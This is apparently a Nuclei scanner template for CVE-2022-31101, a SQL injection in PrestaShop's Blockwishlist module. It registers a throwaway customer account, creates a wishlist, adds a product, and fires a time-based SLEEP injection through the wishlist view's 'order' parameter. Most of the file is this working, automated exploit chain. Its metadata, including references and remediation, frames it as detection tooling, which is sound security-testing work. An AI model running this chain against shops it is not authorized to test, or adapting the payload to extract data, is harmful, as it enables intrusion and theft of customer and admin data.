flow: 'http(1) && http(2) && http(3) && http(4) && (template["id_wishlist"] && template["id_wishlist"][0]
  ? (http(7) && http(8)) : (http(5) && http(6) && http(7) && http(8)))

  '
http:
- extractors:
  - group: 1
    name: version
    regex:
    - <version>\s*<!\[CDATA\[(.*?)\]\]>\s*<\/version>
    type: regex
  host-redirects: true
  matchers:
  - internal: true
    status:
    - 200
    type: status
  - internal: true
    part: body
    type: word
    words:
    - Wishlist block
  - dsl:
    - compare_versions(version, '>= 2.0.0', '<= 2.1.0')
    internal: true
    name: version_check
    type: dsl
  matchers-condition: and
  max-redirects: 3
  method: GET
  path:
  - '{{BaseURL}}/modules/blockwishlist/config.xml'
- extractors:
  - group: 1
    internal: true
    name: id_product_raw
    part: body
    regex:
    - /(\d+)-[a-z0-9\-]+\.html
    type: regex
  - dsl:
    - index(id_product_raw, 0)
    internal: true
    name: id_product
    type: dsl
  host-redirects: true
  max-redirects: 3
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - regex('PrestaShop-[0-9a-f]{32}', header)
    - status_code == 302
    internal: true
    type: dsl
  payloads:
    login_path:
    - login
    - en/login
    - fr/login
    - de/login
    - pl/login
    - es/login
  raw:
  - 'POST /{{login_path}}?create_account=1 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    id_gender=1&firstname={{first_name}}&lastname={{last_name}}&email={{email}}&password={{password}}&birthday=&customer_privacy=1&psgdpr=1&submitCreate=1

    '
  stop-at-first-match: true
- extractors:
  - internal: true
    json:
    - .wishlists[0].id_wishlist
    name: id_wishlist_raw
    part: body
    type: json
  - dsl:
    - index(id_wishlist_raw, 0)
    internal: true
    name: id_wishlist
    type: dsl
  matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - '"id_wishlist"'
    - '"nbProducts"'
    - '"name"'
  raw:
  - 'GET /module/blockwishlist/action?action=getAllWishlist HTTP/1.1

    Host: {{Hostname}}

    '
- id: create-wishlist
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - '"success"'
  raw:
  - 'GET /module/blockwishlist/action?action=createNewWishlist&params[name]=123 HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: id_wishlist_raw
    part: body
    regex:
    - '"id_wishlist":"(\d+)"'
    type: regex
  - dsl:
    - index(id_wishlist_raw, 0)
    internal: true
    name: id_wishlist
    type: dsl
  id: fetch-new-wishlist
  matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - '"id_wishlist"'
    - '"nbProducts"'
    - '"name"'
  raw:
  - 'GET /module/blockwishlist/action?action=getAllWishlist HTTP/1.1

    Host: {{Hostname}}

    '
- id: add-product
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - '"success":true'
  raw:
  - 'POST /module/blockwishlist/action?action=addProductToWishlist&params[id_product]={{id_product}}&params[idWishList]={{id_wishlist_raw}}&params[quantity]=1&params[id_product_attribute]=0
    HTTP/1.1

    Host: {{Hostname}}

    '
- id: sql-inj
  matchers:
  - condition: and
    dsl:
    - duration >= 7
    - contains(to_lower(body), "prestashop")
    name: time-based
    type: dsl
  raw:
  - 'GET /module/blockwishlist/view?id_wishlist={{id_wishlist_raw}}&order=p.name,%20(select%20case%20when%20(1=1)%20then%20(SELECT%20SLEEP(7))%20else%201%20end);%20--%20.asc
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-31101
info:
  author: mastercho
  classification:
    cpe: cpe:2.3:a:prestashop:blockwishlist:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-31101
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.1
    cwe-id: CWE-89
    epss-percentile: 0.97348
    epss-score: 0.43002
  description: 'Prestashop Blockwishlist module version 2.1.0 suffers from a remote
    authenticated SQL injection vulnerability.

    '
  impact: 'Authenticated attackers can exploit SQL injection in the Blockwishlist
    module to extract sensitive database information including customer details, order
    data, and admin credentials from the PrestaShop database.

    '
  metadata:
    max-request: 8
    product: blockwishlist
    vendor: prestashop
  name: Prestashop Blockwishlist 2.1.0 SQL Injection
  reference:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31101
  - https://github.com/PrestaShop/blockwishlist/security/advisories/GHSA-2jx3-5j9v-prpp
  - https://packetstormsecurity.com/files/168003/Prestashop-Blockwishlist-2.1.0-SQL-Injection.html
  remediation: 'Update Prestashop Blockwishlist module to a version newer than 2.1.0
    that properly sanitizes user input and uses parameterized queries.

    '
  severity: high
  tags: packetstorm,cve,cve2022,prestashop,prestashop-module,sqli,intrusive
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
  first_name: '{{rand_base(4, ''abcdefghijklmnopqrstuvwxyz'')}}'
  last_name: '{{rand_base(4, ''abcdefghijklmnopqrstuvwxyz'')}}'
  password: '{{rand_base(8)}}'
